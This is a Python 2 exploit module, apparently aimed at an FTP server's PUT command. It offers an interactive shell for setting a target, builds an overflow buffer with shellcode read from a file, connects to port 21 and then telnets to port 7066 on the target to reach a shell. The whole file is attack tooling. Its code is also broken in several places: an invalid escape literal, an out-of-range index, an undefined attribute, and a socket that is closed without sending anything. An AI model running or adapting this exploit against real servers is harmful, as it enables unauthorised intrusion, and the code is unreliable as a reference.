class Exploit(cmd.Cmd):
  def __init__(self):
    cmd = __import__("cmd")
    cmd.Cmd.__init__(self)
    self.os = __import__("os")
    self.ftplib = __import__("ftplib")
    _tmp = __import__("random", globals(), locals(), ['randint'])
    self.variables = {"":""}
    self.descriptions = {"":""}
    self.name = [""]
    self.target = [""] 
  def help_help(self):
    print "Usage: help [cmd]"
    print "cmd    the command to get help on"
    print "help: show help on a command or list commands"
  def help_set(self):
    print "Usage: set [var] = [val]"
    print "var    variable to set"
    print "val    value to set variable to"
    print "set: set a variable to a value"
    print "Note: you MUST use it exactly as shown: no set [var]=[val]!"
  def do_set(self, args):
    var = getToken(args)
    val = args[len(var) + 3:]
    for variable in self.variables.keys():
      if variable == var:
        self.variables[variable] = val 
    else:
      print "*** Variable not found %s" % var
      return
    print "[*]%s => %s" % (var, val)
  def help_show(self):
    print "Usage: show options"
    print "show options: show the variables, current values, and descriptions"
  def do_show(self, args):
    if args != "options":
      print "*** Unknown argument: " + args
    print "Target: %s" % self.target[0]
    print "Options for %s:" % self.name[0]
    print "========================"
    for variable in self.variables.keys():
      print "%s    %s    %s" % (variable, self.variables[variable], self.descriptions[variable])
  def help_exit(self):
    print "Usage: exit"
    print "exit: exit the %s context" % self.name[0]
  def do_exit(self, args):
    if args:
      print "*** Argument number: needed 0"
      return
    return True
  def help_start(self):
    print "Usage: start"
    print "start: start the attack"
  def do_start(self, args):
    for let in "abcdefghijklmnopqrstuvwxyz":
      if let in self.host[0]:
        self.variables["host"] = gethostbyname(self.variables["host"])
    print "[*]Generating payload..."
    char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
    payload = ""
    for a in range(0, 2017):
      payload += "\x" + char[randint(0, 16)] + char[randint(0, 16)]
    f = open("../../../payloads/pcman_put.shell", "r")
    for line in f.readlines():
      payload += line[:-1].decode('string_escape')
    f.close()
    print "[+]Payload generated."
    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((self.variables["host"], 21))
    s.close()
    print "[+]Payload sent."
    print "[*]Connecting..."
    os.system("telnet %s 7066" % self.variables["host"]) 
